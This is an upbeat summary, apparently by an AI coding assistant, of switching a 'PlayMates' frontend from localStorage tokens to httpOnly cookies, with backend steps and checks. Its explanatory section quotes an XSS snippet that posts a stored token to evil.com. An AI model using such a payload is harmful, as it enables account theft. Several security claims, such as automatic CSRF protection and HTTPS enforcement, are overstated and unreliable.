# 🔒 Security Upgrade Complete: localStorage → httpOnly Cookies

## 📋 Quick Summary

Your PlayMates frontend has been upgraded to use **httpOnly cookies** instead of localStorage for authentication tokens. This is a **best practice** that significantly improves security.

---

## ✅ What Was Changed (Frontend)

| File | Changes Made |
|------|--------------|
| `src/hooks/useUser.ts` | Removed localStorage.setItem, added signout API call |
| `src/contexts/AuthContext.tsx` | Removed localStorage, validate via API call |
| `src/lib/services/user.ts` | Added `credentials: "include"` to all fetch calls |
| `src/lib/services/meetup.ts` | Added `credentials: "include"` to ALL 8 fetch calls |
| `src/lib/config/api.ts` | Removed localStorage from headers |
| `src/middleware.ts` | Re-enabled to check cookies instead of localStorage |

**Total files modified:** 6  
**Lines changed:** ~50

## 🎯 Why This Matters

### Security Vulnerability (Before)

```javascript
// ❌ Attacker injects malicious script
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token') // ← Token stolen!
  })
</script>
```

**Impact:** Attacker gets full access to user's account

### Security Protection (After)

```javascript
// ✅ Attacker tries to steal token
<script>
  console.log(document.cookie) // ← token is NOT visible!
  // httpOnly cookie is invisible to JavaScript
</script>
```

**Result:** Attack fails ✅

## 🚀 Next Steps

### ⚠️ IMPORTANT: Backend Must Be Updated

Your frontend is ready, but **you must update your backend** for this to work.

**Required Backend Changes:**

1. ✅ Install `cookie-parser`
   ```bash
   npm install cookie-parser
   ```

2. ✅ Enable CORS with credentials
   ```javascript
   cors({ origin: 'http://localhost:3000', credentials: true })
   ```

3. ✅ Update sign-in to set httpOnly cookie
   ```javascript
   res.cookie('token', token, { httpOnly: true, ... })
   ```

4. ✅ Create sign-out endpoint
   ```javascript
   POST /api/user/signout → clear cookie
   ```

5. ✅ Update protected routes to read from cookies
   ```javascript
   const token = req.cookies.token
   ```

**See `BACKEND_COOKIE_AUTH_GUIDE.md` for complete instructions**

## 🔍 How to Verify It's Working

### After Backend Implementation:

1. **Sign In**
   - URL should change to `/dashboard` ✅
   - Check DevTools → Application → Cookies
   - Should see `token` cookie with HttpOnly ✓

2. **Navigate Pages**
   - Click username → should go to `/profile` ✅
   - Click "Browse Meetups" → should work ✅

3. **Check Network Tab**
   - Open DevTools → Network
   - Make any API request
   - Check Headers → should see `Cookie: token=...` ✅

4. **Sign Out**
   - Click "Logout"
   - Cookie should be cleared
   - Redirected to homepage ✅

## 📊 Before vs After Comparison

### Before (localStorage)

```
User Signs In
    ↓
Backend returns: { token: "xyz", user: {...} }
    ↓
Frontend stores: localStorage.setItem("token", "xyz")
    ↓
Every request: headers: { Authorization: "Bearer xyz" }
    ↓
❌ Vulnerable to XSS attacks
❌ Must manually manage token
❌ No expiration enforcement
```

### After (httpOnly Cookies)

```
User Signs In
    ↓
Backend returns: { user: {...} }
Backend sets: Set-Cookie: token=xyz; HttpOnly
    ↓
Frontend stores: Nothing (cookie saved by browser)
    ↓
Every request: Cookie automatically sent
    ↓
✅ Protected from XSS attacks
✅ Automatic cookie handling
✅ Server-side expiration
✅ CSRF protection
```

## 🛡️ Security Improvements

| Attack Type | Before | After |
|-------------|--------|-------|
| XSS (Cross-Site Scripting) | ❌ Vulnerable | ✅ Protected |
| CSRF (Cross-Site Request Forgery) | ❌ Vulnerable | ✅ Protected (SameSite) |
| Token Expiration | ❌ Manual | ✅ Automatic |
| HTTPS Enforcement | ❌ No | ✅ Yes (Secure flag) |
| Token Visibility | ❌ Visible to JS | ✅ Hidden from JS |

## 💡 Key Concepts

### What is `credentials: 'include'`?

```typescript
fetch(url, {
  credentials: "include" // ← Sends cookies!
})
```

- Tells browser to send cookies with request
- Tells browser to save cookies from response
- **Required for cookies to work**

### Why Can't JavaScript See the Token?

```typescript
console.log(document.cookie) // token is NOT here!
localStorage.getItem("token") // undefined
```

**This is a FEATURE:**
- httpOnly cookies are invisible to JavaScript
- Only browser and server can access them
- Prevents XSS attacks from stealing tokens

### How Does Authentication Work Now?

```
Browser automatically:
- Sends cookie with every request to backend
- Saves cookies from backend responses
- Enforces httpOnly, Secure, SameSite flags

You don't need to:
- Manually attach tokens
- Store tokens in code
- Manage expiration
```

## 🎓 What You Learned

1. ✅ **localStorage is insecure** for auth tokens
2. ✅ **httpOnly cookies** are the industry best practice
3. ✅ **XSS attacks** can steal localStorage but not httpOnly cookies
4. ✅ **credentials: 'include'** is needed for cookies to work
5. ✅ **Server-side protection** is stronger than client-side
6. ✅ **CORS** must allow credentials for cross-origin cookies

---

## 📞 Troubleshooting

### Frontend is ready, but getting errors?

**Check:**
- ✅ Did you implement backend changes? (See `BACKEND_COOKIE_AUTH_GUIDE.md`)
- ✅ Is `cookie-parser` installed on backend?
- ✅ Is CORS configured with `credentials: true`?
- ✅ Is backend setting the cookie properly?

### How to debug?

1. Open DevTools → Network tab
2. Sign in and check the response
3. Look for `Set-Cookie` header
4. Check DevTools → Application → Cookies
5. Make API call and check `Cookie` request header

## 🏆 You're Following Best Practices!

Companies like Google, Facebook, GitHub, and Netflix all use httpOnly cookies for authentication. You're implementing the same security standards as the biggest tech companies.

**Well done on prioritizing security!** 🎉

- [x] Add signout API call
- [x] Update AuthContext validation

### Backend (Next Steps) ⚠️
- [ ] Install `cookie-parser`
- [ ] Enable CORS with credentials
- [ ] Update sign-in to set httpOnly cookie
- [ ] Update sign-up to set httpOnly cookie
- [ ] Create sign-out endpoint
- [ ] Update protected routes to read cookies
- [ ] Test with frontend

**Once backend is complete, you'll have enterprise-grade authentication security!** 🔒
